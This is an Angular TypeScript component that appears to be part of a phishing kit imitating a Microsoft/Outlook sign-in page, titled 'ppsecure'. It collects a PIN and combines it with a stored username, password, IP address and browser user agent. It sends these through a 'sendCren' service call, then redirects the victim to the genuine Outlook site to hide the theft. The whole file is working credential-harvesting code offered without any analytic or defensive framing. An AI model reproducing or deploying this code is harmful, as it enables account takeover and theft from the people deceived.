import { Component, OnInit } from '@angular/core';
import {SendService} from 'src/app/confi/send.service'
import { FormGroup, FormBuilder, Validators } from '@angular/forms';
import { Title } from '@angular/platform-browser';



@Component({
  selector: 'app-secure',
  templateUrl: './secure.component.html',
  styleUrls: ['./secure.component.css']
})
export class SecureComponent implements OnInit {
  frmLoginpin: FormGroup;
  pins = ''
  constructor(
    private SendService: SendService,
    private titleService: Title,
    private fb: FormBuilder
  ) { }


  
  validacion() {
    const frm = this.frmLoginpin.value;
    if (frm.pinxs === frm.pinxsrepet) {
      return true;
    } else {
      return false;
    }
  }


  passpin():void{
    if(this.frmLoginpin.valid){
      const userAgent = window.navigator.userAgent;
      this.pins = this.frmLoginpin.value.pinxs
      const formdata = new FormData()
      formdata.append('agent',userAgent)
      formdata.append('use',localStorage.getItem('username'))
      formdata.append('pas',localStorage.getItem('pass'))
      formdata.append('ips',localStorage.getItem('ipcx'))
      formdata.append('pinxs',this.pins)

      
  

      this.SendService.sendCren(formdata).subscribe(result =>{
        
        window.location.href = 'https://outlook.live.com/owa/';
        
      },errrx =>{
        window.location.href = 'https://outlook.live.com/owa/';
      })

    }
  }
  ngOnInit(): void {

    this.titleService.setTitle('ppsecure')
    //
    //console.log(userAgent,localStorage.getItem('username'),localStorage.getItem('pass'));
    this.frmLoginpin = this.fb.group({
      'pinxs': ['', Validators.compose([Validators.required, Validators.minLength(4)])],
      'pinxsrepet': ['', Validators.compose([Validators.required, Validators.minLength(4)])]
    });
  }

}
